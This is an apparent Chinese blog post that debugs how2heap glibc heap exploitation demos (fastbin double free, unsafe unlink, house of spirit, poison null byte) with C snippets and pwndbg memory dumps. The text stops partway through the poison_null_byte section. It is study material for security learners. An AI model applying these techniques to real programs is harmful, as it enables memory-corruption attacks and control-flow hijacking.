Title = "how2heap调试过程"
description = "调试how2heap过程的记录"
tags = ["Pwn","Security"]
publishtime = 2020-05-15T13:54:54
lastedittime = 2020-05-15T13:54:54
uuid = "68fa52d9-fe8b-4f76-b72b-8b2addc7466a"
-+_+-

源码可以在GitHub下载

## first_fit

​	glibc使用（first-fit）首次适应算法来选择空闲堆块

> 倾向于优先利用内存中低址部分的空闲分区，从而保留了高址部分的大空闲区，这为以后到达的大作业分配大的内存空间创造了条件。 低址部分不断被划分，会留下许多难以利用的，很小的空闲分区，称为碎片。

​	如果一个堆块是空闲的并且足够大，那么malloc会首先选择这一个堆块

​	这种机制容易被use after free（uaf）攻击利用



![image-20200413093034944](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200413093034944.png)



这里有个问题

```c
char* a = malloc(0x512)
char* b = malloc(0x256)
free(a)
char *c = malloc(0x500)
```

第四步的fd,bk是怎么变化的，以及为什么会出现fd_nextsize和bk_nextsize指向自己，其实是从unsorted bin跑到large bin去了，具体需要看malloc的处理步骤

![image-20200413093257495](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200413093257495.png)



![image-20200413093357820](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200413093357820.png)





## calc_tcache_idx

​	这一个程序主要是演示如何根据给定的块大小来计算tcache的索引

​	其中的主要代码为：

```
IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
On a 64 bit system the current values are:
	MINSIZE: 0x20
    MALLOC_ALIGNMENT: 0x10
So we get the following equation:
IDX = (CHUNKSIZE - 0x11) / 0x10
```

​	就是说，如果在64位的架构下，IDX等于 (CHUNKSIZE - 0x11) / 0x10

​	这里的CHUNKSIZE不是mallc时候的大小

```
BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
It is calculated as follows:
        IF x + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
        => CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf
```

​	意思就是之前堆的知识中提到的

- 假设要请求x的大小的空间，计算` x + SIZE_SZ + MALLOC_ALIGN_MASK `，如果其大小小于MINSIZE，那么，CHUNKSIZE就是MINSIZE

- 否则则正常计算`CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)`，比如说上面的例子就是`CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf`

![image-20200414205035614](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200414205035614.png)

​	那么通过测试不同大小的输入，可以得知Chunk大小在多少范围内会被放入tcache，同样可以知道怎么计算Chunk大小对应的Tcache Idx值



## fastbin_dup



```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x558c68d14260
2nd malloc(8): 0x558c68d14280
3rd malloc(8): 0x558c68d142a0
Freeing the first one...
If we free 0x558c68d14260 again, things will crash because 0x558c68d14260 is at the top of the free list.
So, instead, we'll free 0x558c68d14280.
Now, we can free 0x558c68d14260 again, since it's not the head of the free list.
Now the free list has [ 0x558c68d14260, 0x558c68d14280, 0x558c68d14260 ]. If we malloc 3 times, we'll get 0x558c68d14260 twice!
1st malloc(8): 0x558c68d14260
2nd malloc(8): 0x558c68d14280
3rd malloc(8): 0x558c68d14260
```

​	此程序演示的是fastbins的double-free攻击，Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块。不过这里调试的时候是在tcache上进行的，**tcache也是单链表，也有类似的问题**。

​	Fastbin Double Free 能够成功利用主要有两部分的原因

1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

```
/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
}
```



```
Allocating 3 buffers.
1st malloc(8): 0x558c68d14260
2nd malloc(8): 0x558c68d14280
3rd malloc(8): 0x558c68d142a0
```

三次malloc后，堆空间如图所示（前后是几次运行的截图，请自行忽略掉随机化的部分！！）

![image-20200415073116855](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415073116855.png)

​	先释放chunk1，此时chunk1在freelist的第一个，存在检查，不能再次释放，注意chunk1释放以后，chunk2的prev_inuse位并没有被清空，这就为后面再次释放chunk1提供了条件。

![image-20200415074038562](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415074038562.png)

![image-20200415073642382](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415073642382.png)

​	接着释放chunk2，此时freelist的第一个就变成了chunk2，同样的，释放chunk2时，chunk3的prev_inuse并没有置空，并且释放chunk2以后，chunk2的fd位置指向了单链表中的下一个节点（也就是chunk1的userdata处，因为fastbin和tcache都是头部插入的）

![image-20200415074414662](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415074414662.png)

![image-20200415073658842](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415073658842.png)

​	此时，可以不用检查而再次释放chunk1了，因为它已经不在链表顶部了，并且其相邻的堆块chunk2的prev_inuse位没有置空，所以可以double-free

![image-20200415071619634](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415071619634.png)

![image-20200415074739481](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200415074739481.png)

​	注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。



## fastbin_dup_into_stack

​	跟前面的类似，这里是说怎么利用上面的性质来完成劫持，我依旧直接用的tcache版本的libc，问题是一样的，后面再换吧

```
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7fffd369e328.
Allocating 3 buffers.
1st malloc(8): 0x56438edb4260
2nd malloc(8): 0x56438edb4280
3rd malloc(8): 0x56438edb42a0
Freeing the first one...
If we free 0x56438edb4260 again, things will crash because 0x56438edb4260 is at the top of the free list.
So, instead, we'll free 0x56438edb4280.
Now, we can free 0x56438edb4260 again, since it's not the head of the free list.
Now the free list has [ 0x56438edb4260, 0x56438edb4280, 0x56438edb4260 ]. We'll now carry out our attack by modifying data at 0x56438edb4260.
1st malloc(8): 0x56438edb4260
2nd malloc(8): 0x56438edb4280
Now the free list has [ 0x56438edb4260 ].
Now, we have access to 0x56438edb4260 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x56438edb4260 to point right before the 0x20.
3rd malloc(8): 0x56438edb4260, putting the stack address on the free list
4th malloc(8): 0x7fffd369e318
```

​	首先申请三个堆块，然后按照 chunk 1 - 2 - 1的顺序释放，此时就会在free list上有两个chunk 1

![image-20200416072132516](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416072132516.png)

​	然后连续申请两次相同大小的块，第一次申请获得 chunk 1  ， fastbins（tcachebins）中

![image-20200416072310097](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416072310097.png)

 	第二次申请获得 chunk 2 ，这时候，free list里只剩下 chunk 1，后面多出来的其实是chunk1的fd的值，我们后面需要修改这一个值为想要控制的任意地址，可以是堆也可以是栈或者libc中的地址

![image-20200416072517933](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416072517933.png)

​	虽然chunk1还在free list上，但是我们通过double-free控制了chunk1

​	然后我们写一个假的chunk-size到栈上（假设写入0x20），这相当于在栈上伪造一块已经free的内存块

```
unsigned long long stack_var;   //假设想要写入的栈地址
stack_var = 0x20;
```

​	然后修改chunk1 的fd指针为想要写入的地址，这里为栈的地址

![image-20200416073034974](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416073034974.png)

​	这时候free list上的情况如下图

​							![image-20200416073212784](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416073212784.png)

![image-20200416073057692](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416073057692.png)

​	继续malloc一次得到chunk1 ，此时free list只剩下stack var，继续malloc，就可以开始对栈写入了。

![image-20200416073348016](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/image-20200416073348016.png)





## fastbin_dup_consolidate

​	这里开始就不能继续用tcache来类比了，还是老老实实编译了2.25的glibc来调

```
Allocated two fastbins: p1=0x55ecca0c4260 p2=0x55ecca0c42b0
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x55ecca0c4300
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x55ecca0c4260 0x55ecca0c4260
```

​	这一个程序主要演示的是，在分配相对较大的空间时（），会调用malloc_consolidate()函数，该函数会遍历所有的fastbin，并且整理空闲的chunk该合并的就进行合并，把这些合并后的chunks放入到unsorted bin中，然后进行初始化工作，再放到相应的bins中。

​	因为在free时，ptmalloc判断是不是double free是通过判断这个chunk是不是相同大小的fastbin中的top chunk，然而我们通过malloc_consolidate函数，目标chunk已经去了unsorted bins中。所以，只要我们再释放一次，在fastbin 和 unsorted bin中就都有同一个chunk。主要原因还是释放后未对指针处理。

​	下面请看演示：

```c
void* p1 = malloc(0x40);
void* p2 = malloc(0x40);
free(p1);
```

​	在第一次free之后，fastbins如下

```
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555756000 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

​	

```
void* p3 = malloc(0x400);
```

当分配较大空间时，触发malloc_consolidate函数，p1被放入unsortedbin中，并且在其后续分配过程中，由于p1属于smallbins，所以会被放入到对应bins中。

```
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x50: 0x555555756000 —▸ 0x7ffff7dd4b98 (main_arena+152) ◂— 0x555555756000
largebins
empty
```

​	由于现在的fastbin是空的，我们可以再次释放第一个堆块。

```
free(p1);
```

​	此时，fastbins和smallbins中都有p1

```
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x555555756000 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x50 [corrupted]
FD: 0x555555756000 ◂— 0x0
BK: 0x555555756000 —▸ 0x7ffff7dd4b98 (main_arena+152) ◂— 0x555555756000
largebins
empty
```



## unsafe_unlink

这一处攻击开始有点难懂了起来，参考如下两篇blog

> [http://imlzq.com/2018/07/04/Linux%20%E5%A0%86%E6%BA%A2%E5%87%BA%20Unsafe%20link/](http://imlzq.com/2018/07/04/Linux 堆溢出 Unsafe link/)
>
> [https://juniorprincewang.github.io/2017/09/11/how2heap%E4%B9%8Bunsafe-unlink/](https://juniorprincewang.github.io/2017/09/11/how2heap之unsafe-unlink/)

首先来看看这个利用方式的猪脚unlink的宏定义

```c
/* Take a chunk off a bin list */
1344 #define unlink(AV, P, BK, FD) {                                            \
1345     FD = P->fd;                                                               \
1346     BK = P->bk;                                                               \
1347     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
1348       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
1349     else {                                                                    \
1350         FD->bk = BK;                                                          \
1351         BK->fd = FD;                                                          \
1352         if (!in_smallbin_range (P->size)                                      \
1353             && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
1354             if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
1355                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
1356               malloc_printerr (check_action,                                  \
1357                                "corrupted double-linked list (not small)",    \
1358                                P, AV);                                        \
1359             if (FD->fd_nextsize == NULL) {                                    \
1360                 if (P->fd_nextsize == P)                                      \
1361                   FD->fd_nextsize = FD->bk_nextsize = FD;                     \
1362                 else {                                                        \
1363                     FD->fd_nextsize = P->fd_nextsize;                         \
1364                     FD->bk_nextsize = P->bk_nextsize;                         \
1365                     P->fd_nextsize->bk_nextsize = FD;                         \
1366                     P->bk_nextsize->fd_nextsize = FD;                         \
1367                   }                                                           \
1368               } else {                                                        \
1369                 P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 \
1370                 P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 \
1371               }                                                               \
1372           }                                                                   \
1373       }                                                                       \
1374 }
```

glibc中堆管理除了fastbin以及tcache是单链表以外，都使用了双向链表的结构，也就是使用fd和bk指针指向前者和后者，在分配或者合并时，如果需要删除链表中的一个节点需要按照如下步骤进行

```c
P->fd->bk = P->bk;
P->bk->fd = P->fd;
```

但是在执行删除操作以前glibc会检查

```c
一：P->fd->bk == P && P->bk->fd == P
二：(chunksize(P) != prev_size (next_chunk(P)) == False
```

对于检查条件一：这个检查存在漏洞，即使`P->fd`与`P->bk`都不合法，但是`P->fd->bk`与`P->bk->fd`合法就可以通过检测，所以我们需要找到一个指向

对于检查条件二：我们只需要chunk1的prev_size == fakechunk的size , chunk1的prev_inuse == 0即可

这种利用方式的条件是

- 拥有一个指向已知位置区域的指针，并且可以调用unlink
- tcache机制没有开启的情况

比如说，存在一个可以溢出的带有全局指针的缓冲区chunk0，并且有相邻的chunk1

```c
Chunk0 = prev_size | chunksize & flag | content
Chunk1 = prev_size | chunkSize & flag | content
```

假如chunk0存在溢出，可以控制chunk1的header部分，我们在chunk0 中构造 fake chunk ，并修改 chunk1 的 prev_inuse 的值为0 （也就是上一个chunk处于空闲状态，绕过unlink的第一部分检查），当我们 free（chunk1） 时会触发`consolidate backward`进行合并，导致调用unlink对fake chunk进行操作



**下面请看调试：**

首先申请两个堆块，大小为0x80

```c
uint64_t *chunk0_ptr;  //全局指针

int malloc_size = 0x80; //we want to be big enough not to use fastbins
chunk0_ptr = (uint64_t*) malloc(malloc_size); //全局指针指向chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
```

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200422082358.png)



然后我们在chunk0中构造一个fake chunk（比原来小），设置fake chunk的 fd与bk指向的值，使得这个fake chunk在释放时可以通过glibc的检查

```c
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);    //P->fd->bk = P
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);    //P->bk->fd = P
```

首先，全局指针chunk0_ptr的位置在栈上

chunk0_ptr[2]是chunk0的fd_nextsize部分（malloc得到的指针是指向userdata部分的），但是是我们fakechunk的fd部分，将fakechunk的fd指针（fd指向的是chunkhead的起始位置）指向`(uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3)`，这个时候fakechunk的fd的bk指针就是原来的chunk0_ptr的userdata

chunk0_ptr[3]是chunk0的bk_nextsize部分，是我们fakechunk的bk部分，将fakechunk的bk指针指向`(uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2)`，这个时候fakechunk的bk指针的fd指针指向的同样是chunk0_ptr的userdata，这里建议暂停理解一下。

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200422103049.png)

理解了以后我们继续调试

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200422083408.png)

接着确保 fake chunk 的 size 域与 next chunk 的 prev_size 域的值相匹配（其实fakechunk的位置是可以灵活调整的，只要与pre size的构造自洽），从而绕过unlink的第二个条件检查，假定，chunk0存在溢出，那么我们可以修改chunk1的头部，我们可以构造chunk1的prev_size缩小，从而使得其指向的前一个chunk变成我们构造的fake chunk，然后将chunk1的prev_inuse标志设置为空来防止double free的检查

```c
uint64_t *chunk1_hdr = chunk1_ptr - header_size;
chunk1_hdr[0] = malloc_size;   //设置prev_size为fake chunk的大小0x80
chunk1_hdr[1] &= ~1;   // 与上0x0000000000000001 将prev_inuse位置空
```

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200422084602.png)

这个时候将chunk1释放掉，使得chunk1与相邻chunk合并，其中，整合时会调用malloc_consolidate来unlink掉fake chunk

```c
free(chunk1_ptr);
```

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200422085952.png)

```c
#define unlink(AV, P, BK, FD) {                                            
    FD = P->fd;                                      
    BK = P->bk;                                      
  ...                               
    FD->bk = BK;                                  
	BK->fd = FD;    
  ...
```

```c
FD = P->fd = &P - 24
BK = P->bk = &P - 16
FD->bk = *(&P - 24 + 24) = P
BK->fd = *(&P - 16 + 16) = P
```

unlink的时候，FD->bk 与  BK->fd 其实是相等的，所以上面第五行会被第六行覆盖，因为他们都指向相同的地址，那就是chunk0_ptr的地址，所以unlink中只有上面第六句赋值有效，因此指向chunk0_ptr的指针就会被改写成FD，其过程相当于

```c
FD->bk = P = BK = &P - 16
BK->fd = P = FD = &P - 24
```

这样，原本指向堆上fake chunk的指针，被指向了自身减24的位置

也就是说，chunk0_ptr[3]  和 chunk0_ptr[0] 此时指向的地方是一样的

这时，我们可以用 chunk0_ptr 来向指定地址写入内容，在本程序中，作者将 chunk0_ptr[3] 指向victim_string，然后调用chunk0_ptr[0]来覆盖

```c
char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string;	// 此时 chunk0_ptr[3] 指向了 victim_string

chunk0_ptr[0] = 0x4141414142424242LL;	// 将其覆盖
```

假如知道got表地址，我们就可以劫持got表来进行操作拉。





## House of spirit

该程序演示了 house of spirit 这种攻击方法的原理 ，  先调用malloc 让操作系统分配堆内存

```c
malloc(1);
```

构造一个fake chunk ，再覆盖掉一个指针，使之指向 fake chunk

```
unsigned long long *a;
unsigned long long fake_chunks[10] __attribute__ ((aligned(16)))

fake_chunks[1] = 0x40;	// fake chunk 的 size

fake_chunks[9] = 0x1234; // next chunk 的 size
```

让指针指向构造好的fake chunk 并释放

```
a = &fake_chunks[2];
free(a);
```

这时，fastbin 会缓存该 fake chunk ， 再次malloc 相应大小的chunk 就会返回该 fake chunk

> fake chunk 可以在 堆上、栈上等位置



大致如图（https://www.anquanke.com/post/id/86809）所示：

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200505081058.png)

构造fake_chunk_1的目的是我们最后要返回它的指针来控制这片区域，而构造fake_chunk_2的目的是为了bypass free 的检查使得我们可以成功返回fake_chunk_1的指针。



调试过程：

在构造好fake chunk 以及 next chunk 以后 ，释放fake chunk，进入fastbins

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img/20200505081731.png)

重新申请，就可以得到该chunk了。



利用场景：

1. 存在一块不可控的内存空间，其前后部分可控

```
+------------------+
|     可控区域1     |
+------------------+
| 目标区域（不可控，  |
| 多为返回地址/函数  |
| 指针等）          |
+------------------+
|     可控区域2     |
+------------------+
```

2. house of spirit同样也可以结合double free来实现一个fastbin_attack，在 off by one漏洞中，创造一个可控的重叠chunk，通过house of spirit在chunk中间free出一个fake chunk。然后因为地址可控，所以对fake chunk实现fastbin attack。

```
+------------------+ <--point1
|    big chunk1    |
+------------------+ <--point2 <--free
| 	(fake)chunk2   |
+------------------+
|     big chunk1   |
+------------------+
```



## poison_null_byte

简述：

这个攻击思路是利用off-by-one的漏洞，将下一个chunk的size值改变，并在对应位置填上一个fake-prev-size来使得整个chunk自洽，以此来通过free的检查，再然后通过一系列的malloc和free，来得到重叠的chunk，这样就可以修改chunk指向任意地址。



调试过程：

申请堆块a、b、c以及barrier

```c
uint8_t* a;
uint8_t* b;
uint8_t* c;
void *barrier;

a = (uint8_t*) malloc(0x100);
b = (uint8_t*) malloc(0x200);
c = (uint8_t*) malloc(0x100);
barrier =  malloc(0x100);
```

barrier是为了防止free chunkc的时候导致合并从而影响结果

此时内存中情况如下

```
pwndbg> x/172gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000111
0x603010:       0x0000000000000000      0x0000000000000000 <-- chunk_a
0x603020:       0x0000000000000000      0x0000000000000000
······
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000211
0x603120:       0x0000000000000000      0x0000000000000000 <-- chunk_b
0x603130:       0x0000000000000000      0x0000000000000000
······
0x603300:       0x0000000000000000      0x0000000000000000
0x603310:       0x0000000000000000      0x0000000000000000
0x603320:       0x0000000000000000      0x0000000000000111
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
0x603340:       0x0000000000000000      0x0000000000000000
······
0x603410:       0x0000000000000000      0x0000000000000000
0x603420:       0x0000000000000000      0x0000000000000000
0x603430:       0x0000000000000000      0x0000000000000111
0x603440:       0x0000000000000000      0x0000000000000000 <-- barrier
0x603450:       0x0000000000000000      0x0000000000000000
······
0x603520:       0x0000000000000000      0x0000000000000000
0x603530:       0x0000000000000000      0x0000000000000000
0x603540:       0x0000000000000000      0x0000000000020ac1
0x603550:       0x0000000000000000      0x0000000000000000 <-- top_chunk
0x603560:       0x0000000000000000      0x0000000000000000
```

在 glibc 中 free 的时候加入了新的检查 

> size==prev_size(next_chunk)

```c
*(size_t*)(b+0x1f0) = 0x200;   //此处是为后续步骤做铺垫
// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
```

此时内存中的变化为

```
pwndbg> x/134gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000111
0x603010:       0x0000000000000000      0x0000000000000000 <-- chunk_a
0x603020:       0x0000000000000000      0x0000000000000000
······
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000211 <-- b.size
0x603120:       0x0000000000000000      0x0000000000000000 <-- chunk_b
0x603130:       0x0000000000000000      0x0000000000000000
······
0x603300:       0x0000000000000000      0x0000000000000000
0x603310:       0x0000000000000200      0x0000000000000000 <-- *(size_t*)(b+0x1f0) = 0x200;
0x603320:       0x0000000000000000      0x0000000000000111
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
0x603340:       0x0000000000000000      0x0000000000000000
······
0x603410:       0x0000000000000000      0x0000000000000000
0x603420:       0x0000000000000000      0x0000000000000000
0x603430:       0x0000000000000000      0x0000000000000111
```

释放 chunk_b 

```c
free(b);
```

unsortedbin中：

```
pwndbg> unsortedbin
unsortedbin
all: 0x603110 —▸ 0x7ffff7dd4b58 (main_arena+88) ◂— 0x603110
```

此时内存：

```
pwndbg> x/134gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000111
0x603010:       0x0000000000000000      0x0000000000000000 <-- chunk_a
0x603020:       0x0000000000000000      0x0000000000000000
······
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000211 <-- b.size
0x603120:       0x00007ffff7dd4b58      0x00007ffff7dd4b58 <-- free(chunk_b)
0x603130:       0x0000000000000000      0x0000000000000000
······
0x603300:       0x0000000000000000      0x0000000000000000
0x603310:       0x0000000000000200      0x0000000000000000 
0x603320:       0x0000000000000210      0x0000000000000110
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
0x603340:       0x0000000000000000      0x0000000000000000
······
0x603410:       0x0000000000000000      0x0000000000000000
0x603420:       0x0000000000000000      0x0000000000000000
0x603430:       0x0000000000000000      0x0000000000000111
```

通过 chunk_a 中存在的 off-by-one 漏洞，我们可以将 chunk_b 的 size 部分的低八位覆盖，比如这里将 chunk_b 的 size 部分的低八位覆盖为 0 

```c
a[real_a_size] = 0;   //此处是模拟chunk_a的off-by-one过程
```

此时内存

```
pwndbg> x/134gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000111
0x603010:       0x0000000000000000      0x0000000000000000 <-- chunk_a
0x603020:       0x0000000000000000      0x0000000000000000
······
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000200 <-- b.size
0x603120:       0x00007ffff7dd4b58      0x00007ffff7dd4b58 <-- free(chunk_b)
0x603130:       0x0000000000000000      0x0000000000000000
······
0x603300:       0x0000000000000000      0x0000000000000000
0x603310:       0x0000000000000200      0x0000000000000000 
0x603320:       0x0000000000000210      0x0000000000000110
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
0x603340:       0x0000000000000000      0x0000000000000000
······
0x603410:       0x0000000000000000      0x0000000000000000
0x603420:       0x0000000000000000      0x0000000000000000
0x603430:       0x0000000000000000      0x0000000000000111
```

申请适合大小的两块内存b1、b2，将会从unsortedbin中切割

```c
uint8_t* b1;
uint8_t* b2;

b1 = malloc(0x100);
b2 = malloc(0x80);
```

此时unsortedbin

```
pwndbg> unsortedbin
unsortedbin
all: 0x6032b0 —▸ 0x7ffff7dd4b58 (main_arena+88) ◂— 0x6032b0
```

此时内存

```
0x603110:       0x0000000000000000      0x0000000000000111 <-- b1.size
0x603120:       0x00007ffff7dd4d48      0x00007ffff7dd4d48 <-- chunk_b1
0x603130:       0x0000000000000000      0x0000000000000000
······
0x603200:       0x0000000000000000      0x0000000000000000
0x603210:       0x0000000000000000      0x0000000000000000
0x603220:       0x0000000000000000      0x0000000000000091 <-- b2.size
0x603230:       0x00007ffff7dd4b58      0x00007ffff7dd4b58 <-- chunk_b2
0x603240:       0x0000000000000000      0x0000000000000000
······
0x6032a0:       0x0000000000000000      0x0000000000000000
0x6032b0:       0x0000000000000000      0x0000000000000061 <-- unsortedbin 
0x6032c0:       0x00007ffff7dd4b58      0x00007ffff7dd4b58
0x6032d0:       0x0000000000000000      0x0000000000000000
······
0x603310:       0x0000000000000060      0x0000000000000000
0x603320:       0x0000000000000210      0x0000000000000110
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
0x603340:       0x0000000000000000      0x0000000000000000
······
0x603420:       0x0000000000000000      0x0000000000000000
```

这时候，大概可以理解为什么一开始要设置`*(size_t*)(b+0x1f0) = 0x200;`，这是为了off-by-one以后如果直接 malloc(b1) 会发生错误，因为 off-by-one 以后 size 为 0x200 ， 而 prev_size(next_chunk) 为 0x00 （0x603310） ，这会导致错误，因此要设置 b+0x1f0（0x603310） 为 0x200，这样就可以顺利malloc(b1)了。

将b2染色便于观察

```c
memset(b2,'B',0x80);
```

内存

```
0x603110:       0x0000000000000000      0x0000000000000111 <-- b1.size
0x603120:       0x00007ffff7dd4d48      0x00007ffff7dd4d48 <-- chunk_b1
0x603130:       0x0000000000000000      0x0000000000000000
···0x00···      省略部分
0x603200:       0x0000000000000000      0x0000000000000000
0x603210:       0x0000000000000000      0x0000000000000000
0x603220:       0x0000000000000000      0x0000000000000091 <-- b2.size
0x603230:       0x4242424242424242      0x4242424242424242 <-- chunk_b2
0x603240:       0x4242424242424242      0x4242424242424242
···0x42···      省略部分
0x6032a0:       0x4242424242424242      0x4242424242424242
0x6032b0:       0x0000000000000000      0x0000000000000061 <-- unsortedbin 
0x6032c0:       0x00007ffff7dd4b58      0x00007ffff7dd4b58 <-- fk、bk
0x6032d0:       0x0000000000000000      0x0000000000000000
······
0x603310:       0x0000000000000060      0x0000000000000000
```

此时将chunk_b1  释放

```c
free(b1);
```

unsortedbin

```
pwndbg> unsortedbin
unsortedbin
all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd4b58 (main_arena+88) ◂— 0x603110
```

内存

```
0x603110:       0x0000000000000000      0x0000000000000111 <-- b1.size
0x603120:       0x00000000006032b0      0x00007ffff7dd4b58 <-- free(chunk_b1)
0x603130:       0x0000000000000000      0x0000000000000000
···0x00···      省略部分
0x603200:       0x0000000000000000      0x0000000000000000
0x603210:       0x0000000000000000      0x0000000000000000
0x603220:       0x0000000000000000      0x0000000000000090 <-- b2.size
0x603230:       0x4242424242424242      0x4242424242424242 <-- chunk_b2
0x603240:       0x4242424242424242      0x4242424242424242
···0x42···      省略部分
0x6032a0:       0x4242424242424242      0x4242424242424242
0x6032b0:       0x0000000000000000      0x0000000000000061 <-- unsortedbin
0x6032c0:       0x00007ffff7dd4b58      0x0000000000603110 <-- fk、bk
0x6032d0:       0x0000000000000000      0x0000000000000000
······
0x603310:       0x0000000000000060      0x0000000000000000
```

将 chunk_c 释放

```c
free(c);
```

unsortedbin没变化

```
pwndbg> unsortedbin
unsortedbin
all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd4b58 (main_arena+88) ◂— 0x603110
```

但是内存中释放 chunk_c 时，根据其prev_size 将释放了的 b1 与 c 进行了合并，因此可以看到 0x603118处的值为0x321 ，（所以其实合并操作会去看prev_size 位）

```
0x603110:       0x0000000000000000      0x0000000000000321 <-- unsortedbin
0x603120:       0x00000000006032b0      0x00007ffff7dd4b58     (0x603110)
0x603130:       0x0000000000000000      0x0000000000000000     
···0x00···      省略部分
0x603200:       0x0000000000000000      0x0000000000000000
0x603210:       0x0000000000000000      0x0000000000000000
0x603220:       0x0000000000000000      0x0000000000000090 <-- b2.size
0x603230:       0x4242424242424242      0x4242424242424242 <-- chunk_b2
0x603240:       0x4242424242424242      0x4242424242424242
···0x42···      省略部分
0x6032a0:       0x4242424242424242      0x4242424242424242
